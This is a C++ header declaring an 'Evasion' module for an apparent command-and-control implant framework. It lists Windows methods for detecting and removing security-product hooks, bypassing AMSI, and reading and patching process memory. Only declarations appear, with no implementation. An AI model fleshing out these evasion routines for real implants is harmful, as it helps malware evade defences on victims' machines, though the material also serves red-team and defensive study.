#pragma once

#include "ModuleCmd.hpp"


class Evasion : public ModuleCmd
{

public:
	Evasion();
	~Evasion();

	std::string getInfo();

	int init(std::vector<std::string>& splitedCmd, C2Message& c2Message);
	int process(C2Message& c2Message, C2Message& c2RetMessage);
	int osCompatibility() 
	{
        return OS_WINDOWS;
    }

private:

#ifdef _WIN32
	int checkHooks(std::string& result);
	int unhookFreshCopy(std::string& result);
	int unhookPerunsFart(std::string& result);
	int amsiBypass(std::string& result);
	int introspection(std::string& result, std::string& moduleName);
	int patchMemory(std::string& result, const std::string& hexAddress, const std::string& patch);
	int readMemory(std::string& result, const std::string& hexAddress, const int size);
	int remotePatch(std::string& result);
#endif

};


#ifdef _WIN32

extern "C" __declspec(dllexport) Evasion * A_EvasionConstructor();

#else

extern "C"  __attribute__((visibility("default"))) Evasion * EvasionConstructor();

#endif
